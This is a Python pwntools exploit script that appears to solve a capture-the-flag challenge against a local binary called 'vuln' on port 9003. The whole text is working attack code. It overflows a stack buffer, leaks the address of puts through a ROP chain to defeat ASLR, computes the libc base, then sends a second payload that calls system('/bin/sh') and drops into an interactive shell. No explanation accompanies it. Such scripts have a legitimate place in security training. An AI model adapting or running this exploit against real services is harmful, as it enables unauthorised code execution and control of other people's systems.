#!/usr/bin/env python3
from pwn import *
import os

context.terminal = ["bash", "-lc"]
context.arch = "amd64"
context.log_level = "info"

BIN_PATH = "./vuln"

LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

elf  = ELF(BIN_PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

OFFSET = 64 + 8  

def start():
    return remote("localhost", 9003)

io = start()

io.recvuntil(b"What could possibly go wrong?\n")


pop_rdi = ROP(elf).find_gadget(["pop rdi", "ret"]).address

payload  = b"A" * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])

io.send(payload)

io.recvuntil(b"You said: ")
io.recvline()  
leaked = io.recvline().strip()

puts_leak = u64(leaked.ljust(8, b"\x00"))
log.success(f"puts@libc leak: {hex(puts_leak)}")

libc.address = puts_leak - libc.symbols["puts"]
log.info(f"libc base: {hex(libc.address)}")


bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols["system"]


ret_gadget = ROP(elf).find_gadget(["ret"]).address



payload2  = b"B" * OFFSET
payload2 += p64(ret_gadget)
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

io.send(payload2)

io.interactive()
